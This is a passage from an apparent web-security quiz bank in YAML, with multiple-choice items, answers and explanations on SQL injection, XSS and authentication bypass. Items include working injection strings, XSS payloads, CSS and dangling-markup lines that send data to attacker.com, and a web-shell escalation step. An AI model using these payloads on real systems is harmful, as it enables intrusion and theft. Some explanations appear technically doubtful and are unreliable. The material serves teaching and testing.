# Web Security Academy — Quiz Bank
# Genuinely challenging questions that test understanding, not memorization
# Topics: 7 starter (12 questions each) + 5 secondary (6 questions each)

questions:

  # ============================================================
  # SQL INJECTION (12 questions)
  # ============================================================

  - id: sqli-001
    topic: sql-injection
    type: scenario
    difficulty: intermediate
    question: "A WAF blocks single quotes in all input fields. The backend uses MySQL. Which technique is MOST likely to bypass the WAF and extract data?"
    options:
      - a: "Use double quotes instead — MySQL treats them identically to single quotes in string contexts"
      - b: "Use hex encoding (0x61646D696E) to represent string values without quotes"
      - c: "Use CHAR() function to construct strings character by character"
      - d: "Use backslash escaping (\\') to pass the quote through the WAF"
    answer: "b"
    explanation: "Hex encoding (0x...) in MySQL represents string literals without any quote characters, completely bypassing the WAF. Option A is wrong because MySQL treats double quotes as identifier quotes (like backticks) by default, not string delimiters — unless ANSI_QUOTES mode is enabled. Option C could work but CHAR() still requires parentheses and commas which many WAFs also filter. Option D would likely still be caught since the quote character is present in the request."

  - id: sqli-002
    topic: sql-injection
    type: tricky-concept
    difficulty: advanced
    question: "A developer uses parameterized queries everywhere but constructs ORDER BY clauses dynamically: `query = 'SELECT * FROM users ORDER BY ' + column_name`. Why can't this specific case use standard parameterized query placeholders?"
    options:
      - a: "Parameterized queries can handle ORDER BY — the developer simply used the wrong placeholder syntax"
      - b: "Database engines don't allow parameters in ORDER BY positions because column names are identifiers, not literal values, and placeholders only bind data values"
      - c: "ORDER BY clauses are evaluated before parameter binding occurs in the query execution pipeline"
      - d: "Parameterized queries actually do work here, but only if you use positional (?) placeholders instead of named ones"
    answer: "b"
    explanation: "SQL parameter binding only works for data values (strings, numbers), not for identifiers like column names, table names, or SQL keywords. The database query planner needs to know the column at parse time to build an execution plan. Option A is wrong — no placeholder syntax supports identifiers. Option C inverts the execution order (parsing happens first, but parameters are still value-only). Option D is wrong because the limitation is fundamental to how prepared statements work, regardless of placeholder style."

  - id: sqli-003
    topic: sql-injection
    type: scenario
    difficulty: advanced
    question: "You discover a second-order SQL injection: user registration stores a username unsanitized, and a profile page later uses that username in a query. The app uses parameterized queries for the INSERT during registration. What makes this exploitable?"
    options:
      - a: "Parameterized queries don't actually prevent malicious data from being stored — they only prevent it from being interpreted as SQL during the INSERT"
      - b: "The parameterized query silently fails for INSERT statements, allowing the raw SQL to execute"
      - c: "Second-order injection bypasses parameterized queries because the payload is base64-encoded in the database"
      - d: "The INSERT query's parameterized binding is reversed when the data is read back from the database"
    answer: "a"
    explanation: "This is a critical misconception — parameterized queries prevent SQL injection at the point of query execution, but they don't sanitize the data itself. Malicious SQL syntax is safely stored as data. The vulnerability occurs when that stored data is later retrieved and concatenated into a different query without parameterization. Option B is wrong — parameterized queries work correctly for INSERTs. Option C fabricates a non-existent encoding behavior. Option D misunderstands how data storage works — the database stores the literal string."

  - id: sqli-004
    topic: sql-injection
    type: defense-bypass
    difficulty: advanced
    question: "A WAF blocks all of these keywords: UNION, SELECT, FROM, OR, AND. The backend is MySQL. Which injection technique is MOST likely to still extract data?"
    options:
      - a: "Use stacked queries with a new INSERT to write query results to a table you can read via normal app functionality"
      - b: "Use out-of-band extraction via LOAD_FILE() and INTO OUTFILE to exfiltrate data through DNS or file writes"
      - c: "Use keyword fragmentation with inline comments: UN/**/ION SEL/**/ECT to bypass word-boundary matching"
      - d: "Use time-based blind injection with BENCHMARK() or SLEEP() — neither keyword is blocked"
    answer: "d"
    explanation: "Time-based blind injection using SLEEP() or BENCHMARK() avoids all blocked keywords. You extract data bit by bit using IF() and character comparison with measurable time delays. Option A fails because MySQL doesn't support stacked queries through most common connectors (e.g., PHP's mysqli_query). Option B requires FILE privilege which is almost never granted to web app database users. Option C might work against naive WAFs but modern WAFs normalize comments before matching, so this is unreliable."

  - id: sqli-005
    topic: sql-injection
    type: spot-the-vuln
    difficulty: intermediate
    question: "Consider this Python code:\n```python\ncursor.execute(f\"SELECT * FROM products WHERE category = '{category}' AND released = 1\")\n```\nThe developer argues this is safe because the AND clause ensures only released products show. What is the actual risk?"
    options:
      - a: "An attacker can comment out the AND clause using input like `' OR 1=1--`, seeing unreleased products and potentially all table data"
      - b: "The f-string is safe because Python automatically escapes single quotes in formatted strings"
      - c: "The AND clause is vulnerable but only to boolean-based blind injection since the output is filtered by the application layer"
      - d: "The vulnerability exists but is limited to reading the products table since the query is a SELECT statement"
    answer: "a"
    explanation: "The SQL comment sequence (--) truncates everything after the injection point, completely removing the `AND released = 1` restriction. With `' OR 1=1--` the query becomes `SELECT * FROM products WHERE category = '' OR 1=1-- AND released = 1`, returning all rows. Option B is completely wrong — Python f-strings perform no escaping whatsoever. Option C understates the risk — the attacker gets direct output, not blind. Option D understates the risk — UNION injection can read any table, not just products."

  - id: sqli-006
    topic: sql-injection
    type: tricky-concept
    difficulty: advanced
    question: "You're testing a PostgreSQL application and find injection in a WHERE clause. You try `'; DROP TABLE users--` but the table isn't dropped, even though the injection clearly works for data extraction. What is the MOST likely reason?"
    options:
      - a: "PostgreSQL doesn't support the DROP TABLE syntax used — it requires CASCADE"
      - b: "The database connection uses a low-privilege role that has SELECT but not DROP permissions"
      - c: "Most PostgreSQL client libraries (like libpq) do not support multiple statements in a single query call by default"
      - d: "DROP TABLE is a DDL statement which PostgreSQL always runs in a separate implicit transaction that gets rolled back"
    answer: "c"
    explanation: "Unlike MySQL, PostgreSQL's standard query execution functions (PQexec is an exception, but most frameworks use PQexecParams) reject or ignore stacked queries. The semicolon simply causes a syntax error or is ignored. Option B is plausible but wouldn't be the 'most likely' reason — it would produce a permission error, not silent failure. Option A is wrong — CASCADE is optional. Option D fabricates a non-existent PostgreSQL behavior regarding implicit DDL transactions."

  - id: sqli-007
    topic: sql-injection
    type: scenario
    difficulty: advanced
    question: "You've confirmed blind SQL injection in an Oracle database but SLEEP() and BENCHMARK() don't work. What is the correct Oracle-specific technique for time-based data extraction?"
    options:
      - a: "Use DBMS_PIPE.RECEIVE_MESSAGE('pipe', 10) to introduce a measurable delay"
      - b: "Use UTL_HTTP.REQUEST() to make an outbound HTTP call that introduces network delay"
      - c: "Use WAITFOR DELAY '0:0:10' which is Oracle's native delay function"
      - d: "Use a heavy nested SELECT with XMLTYPE to cause computational delay proportional to data size"
    answer: "a"
    explanation: "DBMS_PIPE.RECEIVE_MESSAGE is Oracle's classic time-based injection primitive — it waits for a message on a named pipe for a specified number of seconds, reliably creating a measurable delay. Option B might work for out-of-band extraction but UTL_HTTP is often restricted by ACLs and doesn't provide precise timing control. Option C is wrong — WAITFOR DELAY is Microsoft SQL Server syntax, not Oracle. Option D is unreliable because computational delay varies with server load and doesn't produce consistent timing."

  - id: sqli-008
    topic: sql-injection
    type: defense-bypass
    difficulty: advanced
    question: "A web app escapes all single quotes by doubling them (replacing ' with ''), which is the database vendor's recommended escaping for the quoting style used. In which scenario does this defense STILL fail?"
    options:
      - a: "When the injection point is inside a numeric context (e.g., WHERE id = $input) where quotes are never used"
      - b: "When the attacker uses Unicode homoglyphs that look like single quotes but have different byte values"
      - c: "When the database uses UTF-8 encoding, which represents single quotes as two bytes that can be split"
      - d: "When the application calls the escape function twice, each round un-escaping the previous one"
    answer: "a"
    explanation: "If user input is placed in a numeric context without quotes, the quote-doubling defense is irrelevant — the attacker doesn't need quotes at all. Input like `1 OR 1=1` breaks out of the numeric context directly. Option B doesn't work because databases parse SQL at the byte level and Unicode homoglyphs are different characters entirely. Option C is wrong — the single quote is a single byte (0x27) in UTF-8. Option D is wrong — doubling the escape function would produce four quotes ('''' → not exploitable), which is still safe."

  - id: sqli-009
    topic: sql-injection
    type: attack-chain
    difficulty: advanced
    question: "You've achieved UNION-based SQL injection on a MySQL target and can read arbitrary database contents. The application runs as a high-privilege database user. What is the MOST impactful next step?"
    options:
      - a: "Read the mysql.user table to extract password hashes, crack them, and access the database directly"
      - b: "Use INTO OUTFILE to write a web shell to the web root, achieving server-side code execution"
      - c: "Use LOAD_FILE() to read /etc/shadow and crack system passwords"
      - d: "Enumerate all databases and tables to find sensitive data like credit cards or credentials"
    answer: "b"
    explanation: "Writing a web shell via INTO OUTFILE gives you OS-level command execution, which is the highest impact escalation from SQL injection. This requires FILE privilege (which a high-privilege user has) and knowing the web root path. Option A is lower impact — you already have database access via injection. Option C sounds devastating but /etc/shadow is typically not readable by the MySQL process user (it requires root). Option D is useful reconnaissance but doesn't escalate your access beyond what you already have."

  - id: sqli-010
    topic: sql-injection
    type: tricky-concept
    difficulty: intermediate
    question: "What is the key difference between UNION-based injection returning `NULL,NULL,NULL` and using `'a','b','c'` when probing for column count?"
    options:
      - a: "NULL is type-compatible with every column data type, while string literals will cause type mismatch errors on non-string columns"
      - b: "NULL values are invisible to WAFs while string literals trigger keyword detection rules"
      - c: "Using NULL is faster because the database doesn't need to allocate memory for the return values"
      - d: "There is no practical difference — both approaches produce identical results across all database engines"
    answer: "a"
    explanation: "NULL is implicitly compatible with any data type (integer, varchar, date, etc.), so UNION SELECT NULL,NULL,NULL will succeed regardless of the original query's column types. String literals like 'a' would cause errors if matched against INTEGER or DATE columns. Option B is wrong — WAFs generally don't treat NULL differently from other SQL keywords. Option C is technically negligible and irrelevant to why NULLs are preferred. Option D is wrong precisely because of the type mismatch issue."

  - id: sqli-011
    topic: sql-injection
    type: scenario
    difficulty: advanced
    question: "You find SQL injection in an INSERT statement: `INSERT INTO logs (user, action) VALUES ('$user', 'login')`. Standard UNION-based extraction doesn't work. What is the MOST effective extraction technique?"
    options:
      - a: "Use a subquery in the injected value: `' || (SELECT password FROM users LIMIT 1) || '` to embed extracted data into the inserted row, then view it through normal application functionality"
      - b: "UNION-based extraction works the same in INSERT contexts — you just need to match the column count of the target table"
      - c: "Convert the INSERT to a SELECT using stacked queries: `'); SELECT password FROM users--`"
      - d: "Use error-based extraction by injecting an invalid type conversion: `' || CAST((SELECT password FROM users LIMIT 1) AS INT)--` to leak data in the error message"
    answer: "a"
    explanation: "Subquery injection within the VALUES clause embeds the extracted data into the row being inserted. If you can later view the logs table through normal app functionality, the extracted data appears as the stored value. Option B is wrong — UNION SELECT requires a SELECT statement context, not INSERT. Option C requires stacked query support, which many DB connectors don't allow, and the SELECT result wouldn't be visible anyway. Option D can work but relies on verbose error messages being displayed, which is less reliable than using application functionality."

  - id: sqli-012
    topic: sql-injection
    type: defense-bypass
    difficulty: advanced
    question: "An application uses a stored procedure for authentication: `CALL check_login(@user, @pass)`. A developer argues this is immune to SQL injection because stored procedures are precompiled. Under what condition is this STILL vulnerable?"
    options:
      - a: "If the stored procedure internally constructs dynamic SQL using string concatenation with the parameters: `EXECUTE('SELECT * FROM users WHERE name = ''' + @user + '''')`"
      - b: "Stored procedures are always immune to SQL injection because the execution plan is compiled before user input is provided"
      - c: "If the CALL statement itself is constructed via string concatenation rather than using parameterized placeholders for the procedure arguments"
      - d: "Both A and C are correct — injection can occur at the procedure call or within the procedure body"
    answer: "d"
    explanation: "There are two distinct injection points. First, if the application builds the CALL statement with string concatenation instead of parameters, the procedure call itself is injectable. Second, even with a safely-called procedure, if the procedure's internal code uses dynamic SQL with string concatenation (EXECUTE/EXEC), the user input can be injected there. Option B is a dangerous myth — 'precompiled' refers to the execution plan, not input handling. The compilation happens with parameter placeholders, not with actual values baked in."

  # ============================================================
  # XSS (12 questions)
  # ============================================================

  - id: xss-001
    topic: xss
    type: defense-bypass
    difficulty: advanced
    question: "A site implements this CSP: `script-src 'self' https://cdn.jsdelivr.net`. How can an attacker achieve XSS despite this policy?"
    options:
      - a: "jsdelivr hosts user-contributed npm packages — an attacker can publish a malicious npm package and load it via the jsdelivr CDN"
      - b: "The 'self' directive allows inline scripts as long as they don't use eval()"
      - c: "CSP only blocks scripts in <script> tags — event handlers like onclick are unaffected by script-src"
      - d: "The attacker can use a meta refresh tag to redirect to a javascript: URI which bypasses CSP"
    answer: "a"
    explanation: "jsdelivr serves any public npm package, so an attacker can publish a package containing malicious JavaScript and reference it from the whitelisted CDN origin. This is a classic CSP bypass via CDN abuse. Option B is wrong — 'self' does NOT allow inline scripts; that requires 'unsafe-inline'. Option C is wrong — CSP's script-src blocks inline event handlers too (they count as inline script). Option D is wrong — CSP blocks javascript: URIs, and meta refresh doesn't support javascript: URIs anyway."

  - id: xss-002
    topic: xss
    type: tricky-concept
    difficulty: advanced
    question: "What is DOM clobbering and why is it dangerous even when a site has strict CSP with no 'unsafe-inline' or 'unsafe-eval'?"
    options:
      - a: "DOM clobbering uses HTML elements with id/name attributes to overwrite JavaScript global variables and DOM API references, manipulating existing trusted script logic without injecting new scripts"
      - b: "DOM clobbering exploits the DOM parser to inject script elements that bypass CSP because they're created during HTML parsing, not JavaScript execution"
      - c: "DOM clobbering overwrites the document.cookie property via a crafted DOM tree, allowing session theft through pure HTML injection"
      - d: "DOM clobbering uses SVG foreignObject elements to create a separate DOM context where CSP doesn't apply"
    answer: "a"
    explanation: "DOM clobbering works by injecting HTML elements whose id or name attributes collide with global variables or DOM properties that existing JavaScript code references. For example, `<img id='x'><img name='x'>` creates a reference where `window.x` returns an HTMLCollection instead of the expected object. This can subvert the logic of already-trusted scripts. Option B is wrong — CSP blocks script elements regardless of how they're created. Option C is wrong — you can't overwrite document.cookie via DOM clobbering. Option D is wrong — SVG foreignObject doesn't create a CSP-exempt context."

  - id: xss-003
    topic: xss
    type: scenario
    difficulty: advanced
    question: "A developer sanitizes XSS by removing all <script> tags using a regex. You need to achieve JavaScript execution. Which payload is MOST reliable?"
    options:
      - a: "`<img src=x onerror=alert(1)>` — uses an event handler which doesn't require script tags"
      - b: "`<scr<script>ipt>alert(1)</scr</script>ipt>` — the regex removes the inner tags, reassembling valid script tags"
      - c: "`<SCRIPT>alert(1)</SCRIPT>` — case sensitivity bypass since the regex only matches lowercase"
      - d: "`<script/src=data:text/javascript,alert(1)>` — uses a self-closing script with a data URI"
    answer: "a"
    explanation: "Event handler attributes (onerror, onload, onmouseover, etc.) execute JavaScript without any script tags, completely bypassing tag-removal defenses. Option B is a well-known trick but unreliable — it depends on whether the regex runs once or recursively, and many implementations handle this. Option C might work but many regex implementations use case-insensitive flags, making this a gamble. Option D doesn't work because HTML parsers don't support self-closing script tags — the parser will keep reading looking for </script>."

  - id: xss-004
    topic: xss
    type: tricky-concept
    difficulty: advanced
    question: "What is mutation XSS (mXSS) and why does it bypass DOMPurify-style sanitizers in some cases?"
    options:
      - a: "mXSS occurs when the browser's HTML parser reinterprets sanitized HTML differently during innerHTML assignment, creating executable markup that didn't exist in the sanitized string"
      - b: "mXSS uses JavaScript prototype pollution to modify the sanitizer's internal allowlist, causing it to permit script elements"
      - c: "mXSS exploits race conditions between the sanitizer running and the DOM rendering, injecting scripts in the gap"
      - d: "mXSS leverages CSS @import rules to load external stylesheets containing JavaScript expressions"
    answer: "a"
    explanation: "Mutation XSS exploits differences between how a sanitizer parses HTML and how the browser's actual parser interprets the same string. For example, a sanitizer might see `<math><mi><table><mglyph><style><!--</style><img src=x onerror=alert(1)>` as safe, but the browser's parser mutates the DOM tree during parsing, moving elements out of their expected context and activating the payload. Option B describes a different attack entirely (prototype pollution). Option C is wrong — there is no timing gap in synchronous innerHTML assignment. Option D is wrong — CSS expressions were removed from modern browsers years ago."

  - id: xss-005
    topic: xss
    type: spot-the-vuln
    difficulty: intermediate
    question: "Consider this code:\n```javascript\nlet url = new URL(location.href);\nlet name = url.searchParams.get('name');\ndocument.getElementById('greeting').innerHTML = `Welcome, ${name}!`;\n```\nWhich vulnerability class does this represent?"
    options:
      - a: "Reflected XSS — the server reflects the name parameter in the response without encoding"
      - b: "DOM-based XSS — the payload flows from a source (URL parameter) to a sink (innerHTML) entirely in client-side JavaScript"
      - c: "Stored XSS — the name value is stored in the URL which persists when shared"
      - d: "Open redirect — the URL object can be manipulated to change the page destination"
    answer: "b"
    explanation: "This is textbook DOM-based XSS: the source is `url.searchParams.get('name')` (attacker-controlled input from the URL) and the sink is `innerHTML` (dangerous DOM API that parses HTML). The server never sees or processes the payload. Option A is wrong because the server is not involved — this is pure client-side JavaScript. Option C is wrong — the URL is not 'stored' in any persistent server-side sense; it's a transient link. Option D is wrong — no navigation or redirect occurs in this code."

  - id: xss-006
    topic: xss
    type: defense-bypass
    difficulty: advanced
    question: "A site's CSP includes `script-src 'self' 'nonce-abc123'` and the nonce value changes on every page load. Assuming you have HTML injection but NOT access to the server response before the victim sees it, which attack is MOST feasible?"
    options:
      - a: "Use CSS injection to exfiltrate the nonce via attribute selectors: `input[nonce^='a'] { background: url(attacker.com/a) }` applied character by character"
      - b: "Use dangling markup injection to capture the nonce: inject `<img src='https://attacker.com/?` which leaves an unclosed attribute that consumes subsequent HTML including the nonce"
      - c: "Use a base tag injection (`<base href='https://attacker.com/'>`) to redirect all relative script URLs to your server"
      - d: "Use meta http-equiv to override the CSP header with a more permissive policy"
    answer: "c"
    explanation: "Injecting `<base href='https://attacker.com/'>` redirects all relative URL script references to load from the attacker's server. If existing scripts use relative paths (`<script src='/js/app.js'>`), they'll load from the attacker's domain instead. Option A won't work because the nonce attribute is consumed during CSP processing and isn't directly accessible as a CSS-selectable DOM attribute in the same way. Option B is creative but modern browsers limit how far dangling markup can consume, and nonces are typically not adjacent in the HTML. Option D is wrong — meta http-equiv can only add CSP restrictions, not relax a header-set CSP."

  - id: xss-007
    topic: xss
    type: scenario
    difficulty: advanced
    question: "You find an injection point inside an SVG file that's served with `Content-Type: image/svg+xml`. The page embeds it with `<img src='user-upload.svg'>`. Can you achieve JavaScript execution in the parent page's context?"
    options:
      - a: "Yes — SVG supports <script> tags and <foreignObject> with embedded HTML, so any JavaScript in the SVG runs in the parent page's context"
      - b: "No — when SVGs are loaded via <img> tags, the browser sandboxes them: scripts don't execute and they have no access to the parent document"
      - c: "Yes — SVG event handlers (onload, onclick) execute in the parent page's context even through <img> embedding"
      - d: "It depends entirely on the CSP — if script-src allows 'self', SVG scripts from the same origin will execute"
    answer: "b"
    explanation: "Browsers deliberately sandbox SVGs loaded via <img> tags — JavaScript is completely disabled, no external resources load, and there's no access to the parent DOM. This is a key security boundary. For SVG XSS to work, the SVG must be loaded via <embed>, <object>, <iframe>, or navigated to directly. Option A describes what SVGs CAN do, but only outside the <img> sandbox. Option C is wrong for the same reason — event handlers are stripped in <img> context. Option D is wrong — CSP is irrelevant because the browser blocks SVG scripts in <img> context before CSP is even consulted."

  - id: xss-008
    topic: xss
    type: tricky-concept
    difficulty: intermediate
    question: "A developer HTML-encodes user output using `&lt;`, `&gt;`, `&amp;`, `&quot;`. Their page has: `<a href=\"USER_INPUT\">Click</a>`. Is this safe?"
    options:
      - a: "Yes — HTML encoding prevents any form of XSS in attribute contexts"
      - b: "No — the attacker can use a `javascript:alert(1)` URI which contains no characters that would be HTML-encoded"
      - c: "No — the attacker can break out of the href attribute using URL-encoded quotes (%22) to inject event handlers"
      - d: "Yes — the double quotes around the attribute prevent breakout, and HTML encoding handles the rest"
    answer: "b"
    explanation: "The string `javascript:alert(1)` contains no angle brackets, ampersands, or quotes, so HTML encoding doesn't modify it at all. When placed in an href attribute, clicking the link executes the JavaScript. This is why URL-context outputs require URL scheme validation (allowlisting http/https), not just HTML encoding. Option A is wrong — HTML encoding prevents attribute breakout but not dangerous URL schemes. Option C is wrong — URL-encoded quotes (%22) are decoded as literal characters in the URL value, not as HTML attribute delimiters. Option D correctly identifies that breakout is prevented, but misses the javascript: URI vector."

  - id: xss-009
    topic: xss
    type: defense-bypass
    difficulty: advanced
    question: "A site uses DOMPurify to sanitize user HTML and then inserts it with innerHTML. The CSP is `default-src 'self'; style-src 'unsafe-inline'`. What attack is still possible?"
    options:
      - a: "CSS injection via style attributes to exfiltrate page data — DOMPurify allows style attributes by default, and CSP permits inline styles"
      - b: "Script execution via mXSS — DOMPurify always has mutation XSS vulnerabilities in its latest version"
      - c: "Injecting an iframe pointing to an attacker-controlled site to perform clickjacking from within the sanitized content"
      - d: "Using meta refresh to redirect the page to a data: URI containing JavaScript"
    answer: "a"
    explanation: "DOMPurify's default configuration allows style attributes, and the CSP explicitly allows 'unsafe-inline' for styles. An attacker can exfiltrate sensitive data (CSRF tokens, page content) using CSS attribute selectors with background-image URLs: `input[value^='a']{background:url(https://attacker.com/a)}`. Option B is wrong — while mXSS bugs have existed, claiming current DOMPurify is always vulnerable is false. Option C won't work because default-src 'self' blocks iframes from other origins (frame-src falls back to default-src). Option D won't work because DOMPurify strips meta tags with http-equiv attributes."

  - id: xss-010
    topic: xss
    type: scenario
    difficulty: intermediate
    question: "You find a reflected injection point inside a JavaScript string: `var search = 'USER_INPUT';`. Single quotes are escaped to `\\'`. How can you break out?"
    options:
      - a: "Use `</script><script>alert(1)//` to close the script block entirely — the HTML parser takes precedence over JavaScript string escaping"
      - b: "Use double quotes instead — JavaScript treats single and double quotes identically so you can break the string with a double quote"
      - c: "Use template literal backticks to break the string context since they aren't being escaped"
      - d: "Use Unicode escapes (\\u0027) to inject a quote that bypasses the escaping function"
    answer: "a"
    explanation: "The HTML parser runs before the JavaScript parser. When it encounters `</script>`, it closes the script block regardless of JavaScript string context. The escaped quote defense only works within the JavaScript layer. Option B is wrong — you can't close a single-quoted string with a double quote in JavaScript; they're distinct delimiters. Option C is wrong — backticks start template literals, but they wouldn't close an already-opened single-quoted string. Option D is wrong — \\u0027 is only interpreted as a quote in JavaScript identifiers, not inside string literals where it remains a literal Unicode escape sequence."

  - id: xss-011
    topic: xss
    type: tricky-concept
    difficulty: advanced
    question: "What is the practical difference between `document.createElement('script').src = url` and `element.innerHTML = '<script src=\"'+url+'\"></script>'` in terms of XSS defense?"
    options:
      - a: "They are equivalent — both create script elements that load and execute external JavaScript"
      - b: "The innerHTML approach won't execute the script — browsers don't execute scripts inserted via innerHTML, while createElement works"
      - c: "The createElement approach is safer because it avoids HTML parsing, while innerHTML parses the HTML context and can be exploited"
      - d: "The innerHTML approach is safer because CSP applies to dynamically created elements but not to innerHTML-injected ones"
    answer: "b"
    explanation: "Per the HTML specification, <script> elements inserted via innerHTML are deliberately not executed by the browser. This is a specific security measure. The createElement approach creates a live script element that WILL execute when appended to the DOM. Option A is wrong because of this critical behavioral difference. Option C has the right intuition about createElement avoiding HTML parsing, but gets the safety conclusion backwards — the innerHTML version is actually 'safer' in this specific case since the script won't execute. Option D inverts reality — CSP applies uniformly."

  - id: xss-012
    topic: xss
    type: attack-chain
    difficulty: advanced
    question: "You've achieved stored XSS in a subdomain (blog.example.com). The main app at www.example.com sets authentication cookies with `Domain=.example.com`. What is the MOST impactful escalation?"
    options:
      - a: "Read the main app's authentication cookies directly from the subdomain XSS since the cookie domain covers both"
      - b: "Use the XSS to set a new cookie for .example.com with a forged session value, performing a session fixation attack on the main app"
      - c: "Make fetch() requests from the subdomain XSS directly to www.example.com API endpoints — the cookies will be sent automatically"
      - d: "Redirect users to a phishing page that mimics the main app login since they're already on a trusted domain"
    answer: "c"
    explanation: "Since cookies are set with `Domain=.example.com`, they're sent to ALL subdomains including blog.example.com. From the XSS context on the subdomain, you can use fetch() with `credentials: 'include'` to make authenticated requests to www.example.com's API, performing actions as the victim. Option A is partially right — you can read cookies IF they lack HttpOnly flag, but most auth cookies are HttpOnly. Option B is possible but lower impact — session fixation requires the victim to authenticate after the cookie is set. Option D is social engineering, not a technical escalation of the XSS."

  # ============================================================
  # AUTHENTICATION (12 questions)
  # ============================================================

  - id: auth-001
    topic: authentication
    type: tricky-concept
    difficulty: advanced
    question: "A developer stores passwords using bcrypt with cost factor 12. A security auditor notices that user passwords are not truncated before hashing. Why might this be a finding?"
    options:
      - a: "Without pre-truncation, extremely long passwords cause bcrypt to be computationally slower, enabling a denial-of-service via long password submissions"
      - b: "bcrypt silently truncates input to 72 bytes — users who think they have a 100-character password actually only have 72 bytes of entropy protected"
      - c: "Long passwords overflow bcrypt's internal buffer, causing a heap corruption vulnerability in older implementations"
      - d: "Passwords longer than 72 characters cause bcrypt to fall back to a weaker hashing algorithm without the cost factor"
    answer: "b"
    explanation: "bcrypt has a hard limit of 72 bytes of input. Anything beyond that is silently ignored. A user with a 100-character passphrase doesn't benefit from those extra characters — and worse, two different passwords that share the first 72 bytes would produce the same hash. Option A has it backwards — bcrypt's cost is fixed regardless of input length. Option C fabricates a buffer overflow that doesn't exist in proper implementations. Option D is wrong — bcrypt doesn't fall back to another algorithm."

  - id: auth-002
    topic: authentication
    type: scenario
    difficulty: advanced
    question: "A JWT-based API validates tokens using RS256. An attacker obtains the server's RSA public key (published at /.well-known/jwks.json). Which attack is MOST viable?"
    options:
      - a: "Forge tokens by changing the algorithm header to HS256 and signing with the public key as the HMAC secret — vulnerable libraries will use the public key for symmetric verification"
      - b: "Use the public key to decrypt existing tokens, modify the claims, re-encrypt them, and send them back"
      - c: "Factor the RSA public key to recover the private key using modern computing resources"
      - d: "Set the algorithm header to 'none' and remove the signature entirely — the server will skip verification"
    answer: "a"
    explanation: "The algorithm confusion attack works because some JWT libraries use the algorithm specified in the token header rather than a server-side configuration. By switching to HS256, the library uses the RSA public key (which the attacker has) as the HMAC symmetric secret. Option B misunderstands JWT — tokens are signed, not encrypted (JWE is different from JWS). Option C is computationally infeasible for properly-sized RSA keys (2048+ bits). Option D (the 'none' algorithm attack) is a real vulnerability class but most modern JWT libraries have patched this, making it less likely to work than the algorithm confusion attack."

  - id: auth-003
    topic: authentication
    type: defense-bypass
    difficulty: advanced
    question: "A site's password reset flow sends a 6-digit numeric code via email, valid for 10 minutes. Rate limiting blocks the IP after 5 wrong attempts. Which bypass is MOST likely to succeed?"
    options:
      - a: "Rotate through different IP addresses using a proxy pool to get 5 attempts per IP, brute-forcing the full code space"
      - b: "Exploit a race condition by sending hundreds of concurrent requests before the rate limiter's counter increments — many will slip through"
      - c: "Request multiple reset codes for the same account, then try each code in sequence since the rate limit tracks codes, not attempts"
      - d: "Use the X-Forwarded-For header with different IPs to bypass IP-based rate limiting if the server trusts this header"
    answer: "d"
    explanation: "Many applications sit behind a reverse proxy and trust the X-Forwarded-For header for client identification. If the rate limiter uses this header value instead of the actual connection IP, an attacker can set arbitrary IPs to get unlimited attempts. Option A could work but requires expensive infrastructure and is slower. Option B is plausible for some implementations, but properly-implemented rate limiters use atomic counters that handle concurrency. Option C is wrong — requesting new codes typically invalidates previous ones, and the rate limit usually tracks attempts per account, not per code."

  - id: auth-004
    topic: authentication
    type: tricky-concept
    difficulty: advanced
    question: "A login form takes 350ms for valid usernames with wrong passwords and 340ms for invalid usernames. The developer argues this 10ms difference is too small to exploit. Why are they wrong?"
    options:
      - a: "An attacker can amplify the timing difference by sending the password field as an extremely large value — bcrypt will take much longer only when it's actually called for valid users"
      - b: "Statistical analysis over many requests can reliably distinguish even nanosecond differences — the 10ms gap is actually enormous by timing attack standards"
      - c: "The attacker can use network timing amplification by routing requests through multiple proxy hops to multiply the delay"
      - d: "The 10ms difference only needs to be distinguishable in aggregate — but the real issue is that the response changes with server load, making it unreliable"
    answer: "b"
    explanation: "With statistical methods (averaging hundreds of requests, filtering outliers), even microsecond differences become reliably detectable. A 10ms difference is actually quite large for timing attacks. Research has demonstrated remote timing attacks over the internet with sub-millisecond precision. Option A describes a real amplification technique but isn't the reason the developer is wrong about the gap being 'too small.' Option C is wrong — adding proxy hops adds noise, not signal; it would make timing attacks harder, not easier. Option D contradicts itself — server load variation is real but doesn't make the attack impossible, just requiring more samples."

  - id: auth-005
    topic: authentication
    type: scenario
    difficulty: advanced
    question: "An OAuth 2.0 implementation uses the authorization code flow. The redirect_uri validation checks that the URI starts with the registered callback URL. An attacker controls a subdirectory on the same domain. Which attack is possible?"
    options:
      - a: "Register a path under the legitimate redirect URI (e.g., `https://app.com/callback/../../attacker-page`) using path traversal to redirect the auth code to an attacker-controlled page"
      - b: "Use an open redirect on the legitimate callback page to chain-redirect the authorization code to an attacker's server via a fragment or query parameter"
      - c: "Append an attacker-controlled path after the registered URI (e.g., `https://app.com/callback/attacker-controlled`) — the prefix check passes and the auth code is sent to a page the attacker controls"
      - d: "Use a homograph domain that visually matches the registered redirect URI to fool the authorization server's comparison"
    answer: "c"
    explanation: "If the redirect_uri validation only checks that the URI starts with the registered value, the attacker can append anything after it. With control of a subdirectory (e.g., via an uploaded HTML file or a path they control), they can receive the authorization code at `https://app.com/callback/their-page`. Option A won't work because path traversal in URLs is normalized by the browser before sending, and the auth server would see the resolved path. Option B describes a real attack vector but requires an open redirect on the callback endpoint specifically, which is a different vulnerability. Option D would be caught by exact string comparison of the domain."

  - id: auth-006
    topic: authentication
    type: defense-bypass
    difficulty: advanced
    question: "A site implements 2FA using TOTP. After entering username/password, the user is redirected to /2fa-verify. An attacker has stolen a user's password but not their TOTP secret. Which bypass is MOST likely?"
    options:
      - a: "Intercept and replay a valid TOTP code within its 30-second window from a previous session the attacker observed"
      - b: "After passing the password step, directly access authenticated endpoints without completing the 2FA step — if the server tracks authentication state per-step rather than requiring both steps to complete"
      - c: "Brute-force the 6-digit TOTP code — there are only 1,000,000 possibilities and the code changes every 30 seconds"
      - d: "Modify the 2FA verification response in a proxy to change the result from 'failed' to 'success' and proceed"
    answer: "b"
    explanation: "A common flaw is that the server grants a partially-authenticated session after the password step, and some endpoints don't verify that 2FA was actually completed. The attacker simply skips the /2fa-verify step and accesses other pages directly. Option A requires the attacker to have intercepted a valid code in real-time, which assumes a much stronger position. Option C won't work because even at 1 attempt per second, 1,000,000 possibilities in 30 seconds is impossible, and rate limiting would apply. Option D only works if authentication state is tracked client-side (in a cookie or token), which is a different vulnerability — most implementations use server-side session state."

  - id: auth-007
    topic: authentication
    type: spot-the-vuln
    difficulty: intermediate
